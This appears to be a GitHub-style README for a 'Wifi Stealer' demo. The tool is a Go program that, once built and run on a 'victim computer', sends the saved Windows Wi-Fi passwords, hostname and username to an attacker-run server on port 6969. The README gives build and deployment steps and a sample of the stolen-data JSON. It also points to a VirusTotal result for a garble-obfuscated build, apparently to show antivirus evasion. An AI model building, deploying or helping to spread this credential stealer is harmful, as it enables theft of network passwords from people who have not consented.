# Wifi Stealer (Demo)

Get saved wifi passwords of a windows computer in a server.

## Usage
Run the server
```sh
$ go run server.go
```
Then put the ip:6969 of your server in main.go file
Build main.go 
```sh
$ go build main.go
```
Then run the generated exe in victim computer

Possible output
```json
{
    "hostname":hostname,
    "time":"hr:min:ss_d-m-y",
    "username":"hostname\\user",
    "wifipw":{
        "ESSID":password,
        ...
        ...
    }
}
```



[Virus Total](https://www.virustotal.com/gui/file/afa99772ea2c41862aa5f0651b655e0c332dab6942c7ed02dc655f345c11ecd5?nocache=1) scan after built with [grable](https://github.com/burrowers/garble)
